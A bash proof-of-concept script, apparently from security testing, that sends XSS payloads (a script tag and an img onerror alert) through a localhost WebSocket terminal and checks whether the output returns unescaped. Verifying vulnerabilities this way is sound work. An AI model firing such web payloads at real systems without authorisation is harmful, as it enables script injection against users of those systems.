#!/bin/bash

# POC: Cross-Site Scripting (XSS) via Unescaped Terminal Output
# This script demonstrates that terminal output is rendered without HTML escaping
# allowing injection of HTML and JavaScript through command output

echo "[*] Testing XSS via unescaped terminal output in WebSocket terminal"
echo "[*] Target: ws://localhost:22222/ws"
echo ""

VULNERABLE_FOUND=0

# Test 1: Simple script tag injection
echo "[TEST 1] Simple <script> tag injection"
echo "[*] Command: echo '<script>alert(1)</script>'"
python3 << 'PYTHON_EOF'
import asyncio
import websockets
import sys

async def test_xss():
    try:
        uri = "ws://localhost:22222/ws"
        async with websockets.connect(uri, ping_interval=None, ping_timeout=None) as websocket:
            # Send command with script tag
            command = "echo '<script>alert(1)</script>'\n"
            await websocket.send(command)
            
            # Receive response
            try:
                response = await asyncio.wait_for(websocket.recv(), timeout=1)
                print(f"[RESPONSE] {repr(response)}")
                
                # Check if script tags are present unescaped
                if "<script>" in str(response) and "&lt;" not in str(response):
                    print("[VULNERABLE] Script tag found unescaped in terminal output")
                    sys.exit(0)
                else:
                    print("[INFO] Script tags not detected as vulnerable")
                    sys.exit(1)
            except asyncio.TimeoutError:
                print("[ERROR] Timeout waiting for response")
                sys.exit(1)
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(1)

try:
    asyncio.run(test_xss())
except Exception as e:
    print(f"[ERROR] Failed: {e}")
    sys.exit(1)
PYTHON_EOF

TEST1_RESULT=$?

echo ""

# Test 2: IMG tag with onerror event
echo "[TEST 2] IMG tag with onerror JavaScript event"
echo "[*] Command: echo '<img src=x onerror=alert(2)>'"
python3 << 'PYTHON_EOF'
import asyncio
import websockets
import sys

async def test_xss_img():
    try:
        uri = "ws://localhost:22222/ws"
        async with websockets.connect(uri, ping_interval=None, ping_timeout=None) as websocket:
            # Send command with img onerror
            command = "echo '<img src=x onerror=alert(2)>'\n"
            await websocket.send(command)
            
            try:
                response = await asyncio.wait_for(websocket.recv(), timeout=1)
                print(f"[RESPONSE] {repr(response)}")
                
                # Check if img tag with onerror is present
                if "onerror=" in str(response) and "&lt;" not in str(response):
                    print("[VULNERABLE] IMG tag with onerror event found unescaped in terminal output")
                    sys.exit(0)
                else:
                    print("[INFO] Event handler not detected as vulnerable")
                    sys.exit(1)
            except asyncio.TimeoutError:
                print("[ERROR] Timeout waiting for response")
                sys.exit(1)
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(1)

try:
    asyncio.run(test_xss_img())
except Exception as e:
    print(f"[ERROR] Failed: {e}")
    sys.exit(1)
PYTHON_EOF

TEST2_RESULT=$?

echo ""

# Summary
echo "[SUMMARY]"
if [ $TEST1_RESULT -eq 0 ] || [ $TEST2_RESULT -eq 0 ]; then
    echo "[SUCCESS] XSS vulnerability confirmed - unescaped HTML/JavaScript in terminal output"
    exit 0
else
    echo "[FAILED] Unable to confirm XSS vulnerability"
    exit 1
fi